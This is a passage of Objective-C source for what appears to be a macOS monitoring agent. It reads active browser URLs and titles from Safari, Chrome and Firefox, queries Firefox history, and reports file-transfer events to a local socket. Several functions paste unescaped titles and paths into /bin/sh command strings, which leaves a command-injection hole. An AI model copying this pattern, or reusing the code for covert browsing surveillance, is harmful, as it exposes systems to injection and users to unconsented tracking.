    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *attributes = [fileManager attributesOfItemAtPath:aFilePath error:nil];
    NSTimeInterval modifiedDate = [[attributes fileModificationDate] timeIntervalSince1970];
    
    NSString *query = [NSString stringWithFormat:@"sqlite3 \"%@\" \"SELECT content FROM moz_annos WHERE anno_attribute_id = 7 AND lastModified >= %f;\"",[self getProfilePathFirefox:aPID],modifiedDate*1000000];
    //DLog(@"####Content query: %@",query);
    NSString *result = [self runAsCommand:query];
    result = [[result componentsSeparatedByString:@"\n"] firstObject];
    //DLog(@"result %@", result);
    NSURL *fileURL = [NSURL URLWithString:result];
    //DLog(@"fileURL.path %@", fileURL.path);
    if ([fileURL.path isEqualToString:aFilePath]) {
        return YES;
    }
    return NO;
}

- (BOOL) isJustModifyFile:(NSString *)aFile {
    BOOL fileJustCreated = NO;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDictionary *attributes = [fileManager attributesOfItemAtPath:aFile error:nil];
    int diffTime = [[NSDate date] timeIntervalSince1970] - [[attributes fileModificationDate] timeIntervalSince1970];
    //DLog(@"####diffTime %d",diffTime);
    if ( diffTime < 5 ){
        fileJustCreated = YES;
    }
    return fileJustCreated;
}

- (NSString*) runAsCommand :(NSString *)aCmd {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    
    NSPipe* pipe = [NSPipe pipe];
    NSTask* task = [[NSTask alloc] init];
    [task setLaunchPath: @"/bin/sh"];
    [task setArguments:@[@"-c", aCmd]];
    [task setStandardOutput:pipe];
    
    [task launch];
    [task release];
    
    NSData *data = [[pipe fileHandleForReading] availableData];
    NSString * result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    
    [pool drain];
    
    return [result autorelease];
}

- (NSString *) getProfilePathFirefox: (pid_t) aPID {
    [self.mFirefoxSearchProfileLock lock];
    
    NSString *placesPath = [self.mFirefoxProfiles objectForKey:[NSNumber numberWithInt:aPID]];
    if (!placesPath) {
        if (aPID != -1) {
            /*
            NSString *cmd = [NSString stringWithFormat:@"lsof -p %d | grep -m 1 'places.sqlite$'", aPID];
            NSTask *task = [[NSTask alloc] init];
            [task setLaunchPath:@"/bin/sh"];
            [task setArguments:@[@"-c", cmd]];
            
            NSPipe *output = [NSPipe pipe];
            [task setStandardOutput:output];
            
            [task launch];
            //[task waitUntilExit];
            [task release];
            
            NSFileHandle *fileHandle = [output fileHandleForReading];
            NSData *data = [fileHandle readDataToEndOfFile];
            NSString *strCMD = [[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] autorelease];
            strCMD = [strCMD stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
            
            NSString *subpath = [[strCMD componentsSeparatedByString:@" /"] lastObject];
            if (subpath.length > 0) {
                placesPath = [NSString stringWithFormat:@"/%@", subpath];
            }*/
            
            NSArray *lsof = [SystemUtilsImpl listOfOpenFileByPID:aPID];
            for (NSString *filePath in lsof) {
                if ([[filePath lastPathComponent] isEqualToString:@"places.sqlite"]) {
                    placesPath = filePath;
                    break;
                }
            }
        }
        
        DLog(@"places.sqlite path by PID : %@", placesPath);
        
        if (placesPath) {
            [self.mFirefoxProfiles setObject:placesPath forKey:[NSNumber numberWithInt:aPID]];
        }
    }
    
    [self.mFirefoxSearchProfileLock unlock];
    
    return placesPath;
}

- (NSArray *) getTargetPIDFromCommand: (NSString *) aCmd {
    NSString * cmd = [NSString stringWithFormat:@"ps -ef | grep \"%@\" | awk '!/(^| )grep( |$)/{print $2}'",aCmd];
    NSString * result = [self runAsCommand:cmd];
    NSArray * split = [result componentsSeparatedByString:@"\n"];
    NSMutableArray * rs = [[NSMutableArray alloc] initWithArray:split];
    
    //DLog(@"result : %@", result);
    
    return [rs autorelease];
}

- (int) getPID: (NSString *) aProcessName active: (bool) aActive {
    int pid = -1;
    NSArray *runningApps = [blbldUtils getRunningProcesses];
    //DLog(@"runningApps : %@", runningApps);
    for (NSDictionary *pInfo in runningApps) {
        if ([[pInfo objectForKey:kRunningProcessNameTag] isEqualToString:aProcessName]) {
            int rPID = [(NSString *)[pInfo objectForKey:kRunningProcessIDTag] intValue];
            if (aActive) {
                int frontmostPID = [[[NSWorkspace sharedWorkspace] frontmostApplication] processIdentifier];
                DLog(@"frontmostPID: %d, rPID : %d", frontmostPID, rPID);
                if (rPID == frontmostPID) {
                    pid = frontmostPID;
                    DLog(@"Found active PID (%@) : %d", aProcessName, pid);
                    break;
                }
            } else {
                pid = rPID;
                DLog(@"Found PID (%@) : %d", aProcessName, pid);
                break;
            }
        }
    }
    return pid;
}

#pragma mark - URL

- (NSString *) getURLSafari {
    NSDictionary *error = nil;
    NSAppleScript *scptFrontmost = [[NSAppleScript alloc] initWithSource:@"delay 0.1 \n tell application \"Safari\" \n return{ URL of current tab of window 1} \n end tell"];
    NSAppleEventDescriptor *result = [scptFrontmost executeAndReturnError:&error];
    [scptFrontmost release];
    //DLog(@"Safari result : %@, error : %@", result, error);
    if (!error) {
        return [result stringValue];
    } else {
        return nil;
    }
}

- (NSString *) getURLChrome {
    NSDictionary *error = nil;
    NSAppleScript *scptFrontmost = [[NSAppleScript alloc] initWithSource:@"delay 0.1 \n tell application \"Google Chrome\" to return {URL of active tab of front window}"];
    NSAppleEventDescriptor *result = [scptFrontmost executeAndReturnError:&error];
    [scptFrontmost release];
    //DLog(@"Chrome result : %@, error : %@", result, error);
    if (!error) {
        return [result stringValue];
    } else {
        return nil;
    }
}

- (NSString *) getURLFirefox: (pid_t) aPID title: (NSString *) aTitle {
    NSString *url = nil;
    NSString *title = aTitle;
    if (title == nil) {
        title = [self getTitleFirefox:aPID];
    }
    NSString *query = [NSString stringWithFormat:@"sqlite3 \"%@\" \"SELECT id,url,last_visit_date FROM moz_places WHERE title = '%@' ORDER BY id DESC LIMIT 1;\"",[self getProfilePathFirefox:aPID],title];
    //DLog(@"#### query: %@",query);
    NSString *result = [self runAsCommand:query];
    if (result) {
        NSArray *cutter = [result componentsSeparatedByString:@"|"];
        if ([cutter count] == 3) {
            url = [cutter objectAtIndex:1];
        }
    }
    //DLog(@"Firefox url : %@", url);
    return url;
}

#pragma mark - Title

- (NSString *) getTitleSafari {
    NSDictionary *error = nil;
    NSAppleScript *scptFrontmost = [[NSAppleScript alloc] initWithSource:@"delay 0.1 \n tell application \"Safari\" \n return name of current tab of window 1 \n end tell"];
    NSAppleEventDescriptor *result = [scptFrontmost executeAndReturnError:&error];
    [scptFrontmost release];
    //DLog(@"Safari result : %@, error : %@", result, error);
    if (!error) {
        return [result stringValue];
    } else {
        return nil;
    }
}

- (NSString *) getTitleChrome {
    NSDictionary *error = nil;
    NSAppleScript *scptFrontmost = [[NSAppleScript alloc] initWithSource:@"delay 0.1 \n tell application \"Google Chrome\" to return title of active tab of front window"];
    NSAppleEventDescriptor *result = [scptFrontmost executeAndReturnError:&error];
    [scptFrontmost release];
    //DLog(@"Chrome result : %@, error : %@", result, error);
    if (!error) {
        return [result stringValue];
    } else {
        return nil;
    }
}

- (NSString *) getTitleFirefox: (pid_t) aPID {
    /*
    NSString *title = nil;
    NSString *query = [NSString stringWithFormat:@"sqlite3 \"%@\" \"SELECT id,title,last_visit_date FROM moz_places ORDER BY id DESC LIMIT 1;\"",[self getProfilePathFirefox:aPID]];
    //DLog(@"#### query: %@",query);
    NSString *result = [self runAsCommand:query];
    if (result) {
        NSArray *cutter = [result componentsSeparatedByString:@"|"];
        if ([cutter count] == 3) {
            title = [cutter objectAtIndex:1];
        }
    }
    DLog(@"Firefox title : %@", title);*/
    /*
    // Cannot get windows even can get object of SBApplication
    NSString *title = nil;
    FirefoxApplication *firefoxApp = (FirefoxApplication *)[SBApplication applicationWithProcessIdentifier:aPID];
    if (firefoxApp) {
        for (FirefoxWindow *window in [[firefoxApp windows] get]) {
            if (window.titled) {
                title = [window name];
                break;
            }
        }
    }
    DLog(@"Firefox app : %@, title : %@", firefoxApp, title);*/
    
    // Only work for one profile of firefox not firefox-bin
    NSString *title = nil;
    FirefoxApplication *firefoxApp = (FirefoxApplication *)[SBApplication applicationWithBundleIdentifier:kDUFirefoxBundleID];
    if (firefoxApp) {
        for (FirefoxWindow *window in [[firefoxApp windows] get]) {
            if (window.titled) {
                title = [window name];
                break;
            }
        }
    }
    DLog(@"Firefox app : %@, title : %@", firefoxApp, title);

    return title;
}

#pragma mark - Socket

- (void) captureInternetFileTransferEvent: (NSString *) aEventWriter {
    SocketIPCSender *sender = [[SocketIPCSender alloc] initWithPortNumber:55502 andAddress:kLocalHostIP];
    [sender writeDataToSocket:[aEventWriter dataUsingEncoding:NSUTF8StringEncoding]];
    [sender release];
}

#pragma mark - Memory management

- (void) dealloc {
    [mSafariTask release];
    [mChromeTask release];
    [mFirefoxTask release];
    
    [mCmdSafari release];
    [mCmdChrome release];
    [mCmdFirefox release];
    
    [mCurrentLogonName release];
    
    [mAvailableProtocol release];
    
    [mLock release];
    [mFirefoxSearchProfileLock release];
    [mOpenPanelMonitor release];
    
    [mFirefoxProfiles release];
    
    [super dealloc];
}

@end
